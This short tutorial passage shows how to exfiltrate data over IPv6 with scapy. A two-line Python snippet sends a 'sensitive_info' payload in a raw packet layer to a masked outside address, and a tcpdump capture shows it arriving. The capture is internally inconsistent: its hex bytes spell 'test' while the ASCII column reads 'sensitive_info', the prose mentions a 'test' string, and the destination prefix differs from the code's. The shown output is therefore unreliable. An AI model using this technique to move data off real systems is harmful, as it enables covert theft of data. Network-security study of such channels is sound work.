# Example of Exfiltration over IPv6 Using Scapy

Libraries like scapy for Python make it easier for developers to interact with networking abstractions at a higher level. 
For example, with only two lines of code we are able to send a crafted packet to an IPv6 endpoint:

```
from scapy.all import IPv6,Raw,send
send(IPv6(dst="XXXX:XXX:X:1663:7a8a:20ff:fe43:93d4")/Raw(load="sensitive_info"))
```

And sniffing on the other endpoint we can see the packet reaching its destination with the extra raw layer where we included the ‘test’ string:

```
# tcpdump -s0 -l -X -i eth0 'ip6 and not icmp6'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
23:47:15.996483 IP6 XXXX:XXX:X:1663::1ce > XXXX:XXX:X:1662:7a8a:20ff:fe43:93d4: no next header
        0x0000:  6000 0000 0004 3b3e XXXX XXXX XXXX 1663  `.....;>.......c
        0x0010:  0000 0000 0000 01ce XXXX XXXX XXXX 1662  ...............b
        0x0020:  7a8a 20ff fe43 93d4 7465 7374 0000       z....C..sensitive_info..
```
